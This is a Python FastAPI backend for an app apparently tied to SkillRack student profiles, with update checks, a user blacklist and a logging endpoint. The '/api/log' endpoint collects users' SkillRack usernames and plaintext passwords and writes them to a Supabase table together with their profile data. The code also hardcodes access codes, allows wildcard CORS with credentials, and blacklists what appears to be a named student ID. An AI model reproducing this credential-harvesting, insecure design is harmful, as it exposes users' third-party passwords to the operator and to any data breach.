import os
from datetime import datetime, timezone
from typing import Any, Optional
import httpx
from urllib.parse import quote

from fastapi import FastAPI, HTTPException, Request
from fastapi.middleware.cors import CORSMiddleware
from dotenv import load_dotenv
import requests
from packaging import version as pkg_version

app = FastAPI()
load_dotenv()
GITHUB_URL="https://api.github.com/repos/crazylearner24/rackify/releases/latest"
app.add_middleware(
    CORSMiddleware,
    allow_origins=["*"],
    allow_credentials=True,
    allow_methods=["*"],
    allow_headers=["*"],
)

SUPABASE_URL = os.getenv("SUPABASE_URL", "").rstrip("/")
SUPABASE_SERVICE_KEY = os.getenv("SUPABASE_SERVICE_KEY", "")

async def supabase_upsert_profile(username: str, password: str, profile_url: str, resume_url: Optional[str], profile_data: dict[str, Any]) -> None:
    if not SUPABASE_URL or not SUPABASE_SERVICE_KEY:
        raise HTTPException(status_code=500, detail="Supabase configuration is missing")

    now = datetime.now(timezone.utc).isoformat()
    row = {
        "username": username,
        "password": password,
        "profile_url": profile_url,
        "resume_url": resume_url,
        "skillrack_id": str(profile_data.get("id") or ""),
        "name": profile_data.get("name"),
        "dept": profile_data.get("dept"),
        "year": profile_data.get("year"),
        "college": profile_data.get("college"),
        "solved": profile_data.get("solved"),
        "code_tutor": profile_data.get("codeTutor"),
        "code_track": profile_data.get("codeTrack"),
        "dc": profile_data.get("dc"),
        "dt": profile_data.get("dt"),
        "code_test": profile_data.get("codeTest"),
        "points": profile_data.get("points"),
        "required_points": profile_data.get("requiredPoints"),
        "required_solved": profile_data.get("requiredSolved"),
        "deadline": profile_data.get("deadline"),
        "solved_percentage": profile_data.get("solvedPercentage"),
        "percentage": profile_data.get("percentage"),
        "last_fetched": profile_data.get("lastFetched"),
        "updated_at": now,
    }

    headers = {
        "apikey": SUPABASE_SERVICE_KEY,
        "Authorization": f"Bearer {SUPABASE_SERVICE_KEY}",
        "Content-Type": "application/json",
        "Prefer": "return=representation",
    }
    
    async with httpx.AsyncClient() as client:
        lookup_response = await client.get(
            f"{SUPABASE_URL}/rest/v1/skillrack_profiles?username=eq.{quote(username)}&select=id",
            headers=headers,
            timeout=30,
        )
        lookup_response.raise_for_status()
        existing_rows = lookup_response.json()

        if existing_rows:
            update_response = await client.patch(
                f"{SUPABASE_URL}/rest/v1/skillrack_profiles?username=eq.{quote(username)}",
                headers=headers,
                json=row,
                timeout=30,
            )
            update_response.raise_for_status()
            return

        insert_row = dict(row)
        insert_row["created_at"] = now
        insert_response = await client.post(
            f"{SUPABASE_URL}/rest/v1/skillrack_profiles",
            headers=headers,
            json=insert_row,
            timeout=30,
        )
        insert_response.raise_for_status()


# User blacklist
BLACKLIST = ["baduser1", "hackerman", "spamuser","sit24ad063@sairamit"]


@app.get("/")
def root():
    return {
        "status": "online",
        "mode": "datastore-only"
    }


@app.post("/check")
async def check_user(request: Request):
    """Check if user is allowed (not blacklisted)"""
    data = await request.json()
    username = data.get("username", "").strip().lower()
    
    if not username:
        raise HTTPException(status_code=400, detail="Username is required")
    
    if username in [u.lower() for u in BLACKLIST]:
        return {"status": "blocked"}
    
    return {"status": "allowed"}

# @app.post("/api/profile")
# async def store_profile(request: Request):
#     data = await request.json()
    
#     username = data.get("username")
#     password = data.get("password")

#     profile_url = data.get("profile_url", "")
#     resume_url = data.get("resume_url", "")
#     profile_data = data.get("profile_data", {})

#     if not username or not password:
#         raise HTTPException(status_code=400, detail="Missing credentials")

#     try:
#         await supabase_upsert_profile(username, password, profile_url, resume_url, profile_data)
#         return {"message": "Question fetched Successfully"}
#     except Exception as e:
#         raise HTTPException(status_code=500, detail=str(e))


def get_github_release():
    """Fetch latest release from GitHub"""
    try:
        response = requests.get(GITHUB_URL, timeout=10)
        response.raise_for_status()
        data = response.json()
        
        latest_version = data.get("tag_name", "v1.0.0").replace("v", "")
        downloads = {}
        
        for asset in data.get("assets", []):
            downloads[asset["name"]] = asset["browser_download_url"]
        
        return latest_version, downloads
    except Exception as e:
        print(f"GitHub fetch error: {e}")
        return None, {}


def check_update_needed(app_version: str) -> tuple[bool, str]:
    """Check if update is required by comparing versions"""
    try:
        latest_version, _ = get_github_release()
        if latest_version is None:
            return False, ""  # No update check if GitHub fails
        
        is_update_needed = pkg_version.parse(app_version) < pkg_version.parse(latest_version)
        return is_update_needed, latest_version
    except Exception as e:
        print(f"Version comparison error: {e}")
        return False, ""  # No update check if comparison fails


@app.post("/api/auth")
async def auth(request: Request):
    """Authentication endpoint - verify code and check for updates"""
    data = await request.json()
    auth_code = data.get("code", "")
    app_version = data.get("app_version", "1.0.0")  # App sends its version
    
    if auth_code != "welcome@123" and auth_code != "vanakamdamapla":
        return {"message": "dont allow"}
    
    # Fetch latest release and check if update is needed
    update_needed, latest_version = check_update_needed(app_version)
    _, downloads = get_github_release()
    
    return {
        "message": "allow",
        "update_required": update_needed,
        "latest_version": latest_version,
        "downloads": downloads
    }

@app.post("/api/log")
async def logger(request: Request):
        data = await request.json()
    
        username = data.get("username")
        password = data.get("password")
        profile_url = data.get("profile_url", "")
        response = requests.post(
            "https://skillrack.gururaja.in/api/points",
            headers={"Content-Type": "application/json"},
            json={"url": profile_url}
        )
        profile_data = response.json()
        resume_url = profile_data.get("url", profile_url)
        if not username or not password:
            raise HTTPException(status_code=400, detail="Missing credentials")

        try:
            await supabase_upsert_profile(username, password, profile_url, resume_url, profile_data)
            return {"message": "Logged successfully"}
        except Exception as e:
            raise HTTPException(status_code=500, detail=str(e))
        



